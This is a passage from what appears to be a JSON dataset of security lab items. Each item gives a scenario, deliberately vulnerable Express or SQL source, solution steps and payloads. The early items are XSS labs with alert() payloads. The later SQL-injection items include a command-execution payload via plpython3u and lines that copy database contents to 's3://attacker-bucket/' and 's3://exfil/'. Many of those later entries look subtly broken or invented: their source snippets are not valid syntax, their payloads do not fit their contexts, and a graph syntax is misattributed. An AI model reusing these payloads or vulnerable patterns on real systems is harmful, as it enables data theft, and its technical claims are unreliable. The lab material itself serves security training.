    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Thank you, ${name}, for your booking!</h3>`);\n});",
    "payloads": [
      "<svg onload=alert('XSS')>",
      "<script>alert('Travel')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in grocery app review comments",
    "Lab Description": "Users can leave comments on grocery items. These comments are stored and shown to others. To solve: Inject a stored XSS payload in the comment field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /submit-comment with comment=<script>alert('Review')</script>",
      "View product page to trigger XSS.",
      "Check persistence via different users.",
      "Try <iframe> payload for alternate execution.",
      "Inspect HTML with DevTools."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (content) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
    "payloads": [
      "<script>alert('Review')</script>",
      "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in library system book description",
    "Lab Description": "Admins can add books with descriptions. Descriptions are rendered on the public catalog without sanitization. To solve: Submit a malicious script in the book description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /add-book with description=<img src=x onerror=alert('Book')>",
      "Visit /catalog and confirm XSS triggers.",
      "Use Burp Suite to monitor payload storage.",
      "Try other tags like <svg> or <marquee>.",
      "Check behavior across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-book', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO books (description) VALUES (?)\", [desc]);\n  res.send('Book added');\n});",
    "payloads": [
      "<img src=x onerror=alert('Book')>",
      "<svg onload=alert('Library')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in event invitation form",
    "Lab Description": "The event invitation form reflects the user\u00e2\u20ac\u2122s input back in the confirmation page. No escaping is done. To solve: Submit a malicious name to trigger XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /invite with name=<script>alert('Invite')</script>",
      "Observe confirmation page behavior.",
      "Try encoded payloads to bypass filters.",
      "Test reflection with DevTools inspection.",
      "Confirm execution without login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/invite', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Welcome to the event, ${name}</p>`);\n});",
    "payloads": [
      "<script>alert('Invite')</script>",
      "<img src=1 onerror=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in student portal report comments",
    "Lab Description": "Teachers can leave comments on student reports. These are rendered for students without sanitization. To solve: Inject a script in the comment and test across accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "POST /submit-report-comment with comment=<script>alert('Student')</script>",
      "Login as student and view the report.",
      "Confirm execution of the injected script.",
      "Try <svg> tag injection for variety.",
      "Inspect rendering DOM context."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-report-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO report_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('Student')</script>",
      "<svg/onload=alert('Report')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in restaurant feedback popup",
    "Lab Description": "Users can send quick feedback after checkout. Feedback is reflected in a modal without escaping. To solve: Inject a script in the feedback form.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /quick-feedback with message=<script>alert('Food')</script>",
      "Observe feedback rendering in modal.",
      "Test encoded and double-encoded versions.",
      "Use onerror and onmouseover payloads.",
      "Confirm trigger inside modal container."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/quick-feedback', (req, res) => {\n  const msg = req.body.message;\n  res.send(`<div class='popup'>${msg}</div>`);\n});",
    "payloads": [
      "<script>alert('Food')</script>",
      "<svg onload=alert('Popup')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in portfolio builder bio section",
    "Lab Description": "Users can build a public portfolio with a bio. The bio input is rendered using innerHTML with no sanitation. To solve: Inject a script in the bio section.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /update-bio with bio=<script>alert('Bio')</script>",
      "Visit /profile to view injected payload.",
      "Test various injection formats.",
      "Use Repeater to confirm persistence.",
      "Confirm DOM-based trigger via DevTools."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.user.id]);\n  res.send('Bio updated');\n});",
    "payloads": [
      "<script>alert('Bio')</script>",
      "<img src=x onerror=alert('Profile')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in conference session proposal form",
    "Lab Description": "Speakers submit proposals including session abstracts. Abstracts are rendered on the public agenda page without sanitization. To solve: Submit a malicious abstract.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /submit-session with abstract=<script>alert('Session')</script>",
      "Check /agenda for execution.",
      "Test with other tags like <style> or <iframe>.",
      "Use Burp to observe storage details.",
      "Validate script fires without login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-session', (req, res) => {\n  const abstract = req.body.abstract;\n  db.query(\"INSERT INTO sessions (abstract) VALUES (?)\", [abstract]);\n  res.send('Proposal received');\n});",
    "payloads": [
      "<script>alert('Session')</script>",
      "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in contact form reply page",
    "Lab Description": "After users submit a contact form, their name and message are echoed in a reply page without escaping. To solve: Inject a script in the message input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /contact with message=<svg onload=alert('Contact')>",
      "Observe rendering of the message on reply screen.",
      "Try <script> tags and <img> tags.",
      "Test both GET and POST contexts.",
      "Confirm DOM injection using DevTools."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const msg = req.body.message;\n  res.send(`<div>Reply: ${msg}</div>`);\n});",
    "payloads": [
      "<svg onload=alert('Contact')>",
      "<script>alert('Form')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in classroom discussion board",
    "Lab Description": "The classroom platform allows students to post questions. These posts are stored and rendered without escaping HTML. To solve: Inject a persistent XSS payload in a question submission.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /ask-question with question=<script>alert('ClassXSS')</script>",
      "View the board as another user.",
      "Observe the payload executing.",
      "Inspect the DOM with DevTools.",
      "Confirm persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO questions (content) VALUES (?)\", [question]);\n  res.send('Question posted');\n});",
    "payloads": [
      "<script>alert('ClassXSS')</script>",
      "<img src=x onerror=alert('Board')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in resume preview form",
    "Lab Description": "The resume builder reflects user input in the live preview. No sanitization is done. To solve: Inject a script in the 'skills' field and trigger XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /preview-resume with skills=<svg onload=alert('Skills')>",
      "View the preview response.",
      "Try with <img> and <iframe> tags.",
      "Use Burp to verify reflection.",
      "Confirm behavior across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-resume', (req, res) => {\n  const skills = req.body.skills;\n  res.send(`<div>Your Skills: ${skills}</div>`);\n});",
    "payloads": [
      "<svg onload=alert('Skills')>",
      "<script>alert('Resume')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user-submitted FAQ content",
    "Lab Description": "Users can suggest FAQ entries. These are reviewed by admins and displayed directly on the FAQ page. Input is not sanitized. To solve: Inject script in the question or answer field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /submit-faq with answer=<script>alert('FAQ')</script>",
      "Open FAQ page and view entry.",
      "Confirm execution on load.",
      "Use <svg> tag variants to test.",
      "Ensure persistence across reloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-faq', (req, res) => {\n  const answer = req.body.answer;\n  db.query(\"INSERT INTO faqs (answer) VALUES (?)\", [answer]);\n  res.send('Submitted');\n});",
    "payloads": [
      "<script>alert('FAQ')</script>",
      "<svg onload=alert('FAQ')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online invoice client name field",
    "Lab Description": "The invoice generator reflects the client name after generation. The name is not escaped before being inserted into the DOM. To solve: Inject XSS in the client name field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /generate-invoice with name=<script>alert('Invoice')</script>",
      "Observe the name reflected.",
      "Test various HTML tag injections.",
      "Verify execution via browser console.",
      "Try encoded variations."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-invoice', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Invoice for: ${name}</p>`);\n});",
    "payloads": [
      "<script>alert('Invoice')</script>",
      "<img src=1 onerror=alert('Client')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in public travel diary entries",
    "Lab Description": "Users can submit travel experiences as diary entries. These are displayed on a public feed without filtering HTML content. To solve: Inject a script into the diary body.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /add-diary with entry=<script>alert('Travel')</script>",
      "Visit the public diary feed.",
      "Confirm execution occurs.",
      "Try obfuscated versions of the payload.",
      "Verify across multiple browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-diary', (req, res) => {\n  const entry = req.body.entry;\n  db.query(\"INSERT INTO diaries (content) VALUES (?)\", [entry]);\n  res.send('Diary posted');\n});",
    "payloads": [
      "<script>alert('Travel')</script>",
      "<svg onload=alert('Diary')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in e-commerce coupon generator",
    "Lab Description": "Users receive a coupon preview with their name. The name is reflected back into the HTML. To solve: Inject script into the name parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /coupon-preview with name=<img src=x onerror=alert('Coupon')>",
      "Inspect reflected content.",
      "Test with encoded characters.",
      "Confirm payload renders as HTML.",
      "Try in different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/coupon-preview', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Hello ${name}, here is your coupon!</h2>`);\n});",
    "payloads": [
      "<img src=x onerror=alert('Coupon')>",
      "<script>alert('CouponGen')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in chatroom private messages",
    "Lab Description": "Private messages in the chatroom are stored and displayed using innerHTML without filtering. To solve: Inject a persistent XSS payload into the message content.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /send-message with message=<script>alert('Private')</script>",
      "Login as recipient and check inbox.",
      "Observe script execution.",
      "Use DevTools to monitor changes.",
      "Confirm persistence after logout/login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO messages (body) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('Private')</script>",
      "<img src=x onerror=alert('Chat')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in IT support ticket notes",
    "Lab Description": "Users can leave notes on their IT support tickets. These notes are stored and rendered on the support view without escaping. To solve: Inject a payload in the note body.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /add-ticket-note with note=<svg onload=alert('Ticket')>",
      "Login as support and view ticket.",
      "Verify execution in dashboard.",
      "Check DOM via DevTools.",
      "Test with alternative tags."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO ticket_notes (note) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
    "payloads": [
      "<svg onload=alert('Ticket')>",
      "<script>alert('Support')</script>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter signup thank-you page",
    "Lab Description": "The thank-you page reflects the user\u00e2\u20ac\u2122s email address after signup. Email is not escaped. To solve: Inject script into the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /signup-newsletter with email=<svg onload=alert('Mail')>",
      "Observe reflection in the thank-you message.",
      "Test with <script> and <img> payloads.",
      "Use OWASP ZAP to replay the request.",
      "Verify payload executes properly."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/signup-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Thank you for subscribing, ${email}!</p>`);\n});",
    "payloads": [
      "<svg onload=alert('Mail')>",
      "<script>alert('Newsletter')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in food delivery review system",
    "Lab Description": "Customers can submit reviews on food deliveries. These reviews are shown publicly without sanitation. To solve: Inject XSS into the review content.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /leave-review with review=<script>alert('Food')</script>",
      "Open the food item page.",
      "Confirm script executes.",
      "Test with <img> and <iframe> variants.",
      "Check storage with Burp Suite."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/leave-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO reviews (text) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('Food')</script>",
      "<img src=x onerror=alert('Delivery')>"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL CREATE TRANSFORM",
    "Lab Description": "A data processing system dynamically creates PostgreSQL transforms between data types. The transform functions are concatenated directly into CREATE TRANSFORM statements, allowing injection during type conversion operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify transform creation endpoints",
      "Inject through FROM SQL function parameter",
      "Bypass language handler validation",
      "Execute commands during type conversion",
      "Pivot through connected data pipelines"
    ],
    "Vulnerability name": "PostgreSQL Transform Injection",
    "srcCode": "CREATE TRANSFORM FOR type_name LANGUAGE sql (FROM SQL WITH FUNCTION '\\'' + userFunction + '\\'')",
    "payloads": [
      "pg_catalog.obj_description') FROM pg_class--",
      "plpython3u_inline() LANGUAGE plpython3u AS $$import os; os.system('id')$$--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL Component_Service Metrics",
    "Lab Description": "A monitoring system uses MySQL's component_service metrics with dynamic filter expressions. The metric filters are concatenated directly into performance_schema queries, allowing injection through crafted metric names.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify component_service usage",
      "Inject through metric filter parameters",
      "Bypass metric name validation",
      "Access restricted performance data",
      "Exfiltrate via metric aggregation"
    ],
    "Vulnerability name": "MySQL Component Metrics Injection",
    "srcCode": "CALL component_service.get_metric('\\'' + userMetric + '\\'')",
    "payloads": [
      "cpu_utilization' FROM (SELECT * FROM mysql.user) x--",
      "memory_usage' WHERE 1=0 UNION SELECT 1,2,table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Graph SHORTEST_PATH Node Filters",
    "Lab Description": "A graph analytics platform builds SHORTEST_PATH queries with dynamic node filters. The filter conditions are concatenated directly into graph traversal logic, allowing injection during path calculation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify SHORTEST_PATH usage",
      "Craft malicious node property filters",
      "Bypass graph syntax validation",
      "Access unauthorized graph nodes",
      "Exfiltrate relationship data"
    ],
    "Vulnerability name": "SQL Server Graph Path Injection",
    "srcCode": "MATCH SHORTEST_PATH((n {name: '\\'' + userFilter + '\\''})-[*]->(m))",
    "payloads": [
      "admin' OR 1=CONVERT(INT,(SELECT @@version))--",
      "test'})-[*]->(m) WHERE EXISTS(SELECT * FROM sys.sql_logins)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle Text INDEX SET STOPLIST",
    "Lab Description": "A document search system dynamically configures Oracle Text stoplists. The stoplist parameters are concatenated directly into index maintenance operations, allowing injection during search optimization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify stoplist configuration",
      "Inject through stopword parameters",
      "Bypass CTXSYS privilege checks",
      "Manipulate search results",
      "Access indexed document content"
    ],
    "Vulnerability name": "Oracle Text Stoplist Injection",
    "srcCode": "CTX_DDL.SET_STOPLIST('\\'' + userIndex + '\\'', '\\'' + userStoplist + '\\'')",
    "payloads": [
      "ctxsys.ctx_report.index_size') FROM all_indexes--",
      "default_stoplist', 'ctx_output.start_log(''/tmp/pwned'')')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake EXTERNAL FUNCTION Request Transformers",
    "Lab Description": "A Snowflake pipeline uses external functions with dynamic request transformers. The JavaScript transformer code is concatenated directly into function definitions, allowing injection during API request generation.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify external function creation",
      "Inject through request_transformer parameter",
      "Bypress JavaScript sandboxing",
      "Execute arbitrary Snowflake SQL",
      "Access account usage data"
    ],
    "Vulnerability name": "Snowflake Request Transformer Injection",
    "srcCode": "CREATE EXTERNAL FUNCTION my_func() RETURNS VARIANT REQUEST_TRANSFORMER = '\\'' + userJs + '\\''",
    "payloads": [
      "function transform() { return execute('SELECT * FROM information_schema.tables'); }",
      "() => { return {sqlText: 'SELECT current_role()'}; }"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery ARRAY_AGG Order By Clause",
    "Lab Description": "A data visualization tool builds ARRAY_AGG queries with dynamic ORDER BY expressions. The sort clauses are concatenated directly into array aggregation, allowing injection during result ordering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ARRAY_AGG usage",
      "Inject through ORDER BY parameter",
      "Bypass array function constraints",
      "Access project metadata",
      "Exfiltrate via sorted array elements"
    ],
    "Vulnerability name": "BigQuery Array Order Injection",
    "srcCode": "SELECT ARRAY_AGG(name ORDER BY '\\'' + userSort + '\\'') FROM users",
    "payloads": [
      "1) FROM (SELECT dataset_id FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)--",
      "(SELECT COUNT(*) FROM sensitive_tables)) OVER()--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse CETAS Partition Clause",
    "Lab Description": "A data pipeline creates CETAS tables with dynamic partition specifications. The partition clauses are concatenated directly into external table creation, allowing injection during file writing operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CETAS partition usage",
      "Inject through PARTITION BY parameter",
      "Bypass path validation",
      "Modify file output structure",
      "Exfiltrate via partition directories"
    ],
    "Vulnerability name": "Synapse CETAS Partition Injection",
    "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (PARTITION ('\\'' + userPartition + '\\'')) AS SELECT * FROM source",
    "payloads": [
      "col1='value'') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
      "date='2023-01-01')) FROM sys.dm_pdw_exec_requests--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Delta Lake OPTIMIZE ZORDER BY",
    "Lab Description": "A data optimization job uses OPTIMIZE with dynamic ZORDER BY columns. The column names are concatenated directly into file reorganization commands, allowing injection during data compaction.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OPTIMIZE operations",
      "Inject through ZORDER BY parameter",
      "Bypass column name validation",
      "Access unauthorized table versions",
      "Manipulate file layout"
    ],
    "Vulnerability name": "Delta Lake ZORDER Injection",
    "srcCode": "OPTIMIZE delta.`/path` ZORDER BY ('\\'' + userColumns + '\\'')",
    "payloads": [
      "id') FROM (DESCRIBE HISTORY delta.`/path/to/sensitive_table`)--",
      "email')) SET TBLPROPERTIES ('comment'=(SELECT * FROM hive_metastore.default.secrets))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD MANIFEST",
    "Lab Description": "A data export pipeline uses UNLOAD with dynamic manifest options. The manifest parameters are concatenated directly into S3 export operations, allowing injection during file listing generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify UNLOAD MANIFEST usage",
      "Inject through manifest options",
      "Bypass S3 path validation",
      "Modify export behavior",
      "Exfiltrate via manifest files"
    ],
    "Vulnerability name": "Redshift Manifest Injection",
    "srcCode": "UNLOAD ('SELECT * FROM table') TO 's3://path' MANIFEST '\\'' + userOptions + '\\''",
    "payloads": [
      "true') FROM svv_external_tables--",
      "false'))) COPY (SELECT * FROM pg_user) TO 's3://attacker-bucket/'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake STREAMS Table Parameter",
    "Lab Description": "A change data capture system creates STREAMS with dynamic table parameters. The table specifications are concatenated directly into change tracking setup, allowing injection during stream initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify STREAM creation",
      "Inject through table name parameter",
      "Bypass change tracking validation",
      "Access unauthorized change data",
      "Exfiltrate via stream content"
    ],
    "Vulnerability name": "Snowflake Stream Table Injection",
    "srcCode": "CREATE STREAM my_stream ON TABLE '\\'' + userTable + '\\''",
    "payloads": [
      "legit_table') FROM (SELECT * FROM information_schema.tables)--",
      "sensitive_data')) CHANGE_TRACKING = TRUE RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT CASCADE",
    "Lab Description": "A schema migration tool builds INTERLEAVE IN PARENT clauses with dynamic cascade options. The cascade parameters are concatenated directly into table relationships, allowing injection during schema modification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify interleaved table creation",
      "Inject through CASCADE parameter",
      "Bypass schema validation",
      "Modify table relationships",
      "Access unauthorized datasets"
    ],
    "Vulnerability name": "Spanner Interleave Cascade Injection",
    "srcCode": "CREATE TABLE child INTERLEAVE IN PARENT parent '\\'' + userCascade + '\\''",
    "payloads": [
      "ON DELETE CASCADE') FROM (SELECT * FROM information_schema.tables)--",
      "ON UPDATE NO ACTION))) SELECT * FROM SPANNER_SYS.KEY_COLUMN_USAGE--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Data Explorer External Table Schema Inference",
    "Lab Description": "A Kusto cluster creates external tables with dynamic schema inference parameters. The inference clauses are concatenated directly into schema detection, allowing injection during table creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify external table creation",
      "Inject through schema inference parameters",
      "Bypass type detection validation",
      "Modify query results",
      "Access unauthorized storage paths"
    ],
    "Vulnerability name": "Kusto Schema Inference Injection",
    "srcCode": ".create external table ext_data (['\\'' + userSchema + '\\''])",
    "payloads": [
      "col1:string) FROM (SELECT * FROM .show tables) x--",
      "col1:dynamic) WITH (FORMAT='JSON') WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
    "Lab Description": "An application builds Elasticsearch ODBC connection strings with dynamic properties. The properties are concatenated directly into driver initialization, allowing injection during connection establishment.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ODBC connection points",
      "Inject through connection properties",
      "Bypass driver validation",
      "Access restricted indices",
      "Exfiltrate via driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Connection Injection",
    "srcCode": "Driver={Elasticsearch ODBC};Server=\"{{userServer}}\";Properties=\"{{userProps}}\"",
    "payloads": [
      "attacker.com;security=\\\\\\\" + (SELECT * FROM information_schema.tables) + \\\\\\\"--",
      "legit.com:9200\\\";UID=admin\\\";PWD=' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
    "Lab Description": "A Druid cluster processes SQL queries with dynamic identifier escaping. The escape sequences are concatenated directly into query planning, allowing injection through crafted identifier patterns.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify dynamic identifier usage",
      "Inject through escape sequences",
      "Bypass SQL parser validation",
      "Access system metadata tables",
      "Execute native Druid queries"
    ],
    "Vulnerability name": "Druid Identifier Escape Injection",
    "srcCode": "SELECT * FROM \"{{userTable}}\"",
    "payloads": [
      "datasource\\\\\" FROM (SELECT * FROM sys.segments) x--",
      "legit_table\\\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux Yield Name Parameter",
    "Lab Description": "A monitoring system uses InfluxDB Flux with dynamic yield names. The yield identifiers are concatenated directly into result processing, allowing injection during data output generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify yield statement usage",
      "Inject through yield name parameter",
      "Bypass Flux parser validation",
      "Modify query results",
      "Exfiltrate via yielded output"
    ],
    "Vulnerability name": "Flux Yield Name Injection",
    "srcCode": "from(bucket:\\\"metrics\\\") |> yield(name: \\\"{userYield}\\\")",
    "payloads": [
      "result\\\" FROM (SELECT * FROM sql_metrics) x--",
      "data\\\" WHERE 1=0) UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Refresh Policy",
    "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialization jobs, allowing injection during view maintenance.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify continuous aggregates",
      "Inject through refresh policy parameters",
      "Trigger materialization jobs",
      "Bypass time bucket validation",
      "Compromise hypertable data"
    ],
    "Vulnerability name": "Timescale Refresh Policy Injection",
    "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
    "payloads": [
      "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
      "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB Changefeed Filter Expressions",
    "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation, allowing injection during data capture.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify changefeed creation",
      "Inject through filter parameter",
      "Trigger change events",
      "Bypass CDC validation",
      "Exfiltrate via webhook payloads"
    ],
    "Vulnerability name": "CockroachCDC Filter Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
    "payloads": [
      "SELECT * FROM users WHERE type = 'admin'--",
      "SELECT *, (SELECT version()) FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
    "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations, allowing injection during file access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify S3 configuration points",
      "Inject through endpoint parameters",
      "Bypass URL validation",
      "Modify remote data access",
      "Exfiltrate credentials"
    ],
    "Vulnerability name": "DuckDB S3 Endpoint Injection",
    "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
    "payloads": [
      "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
      "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
    "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH DATA clauses are concatenated directly into view creation, allowing injection during initial population.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify materialized view creation",
      "Inject through WITH DATA parameter",
      "Trigger view population",
      "Bypass data validation",
      "Modify view contents"
    ],
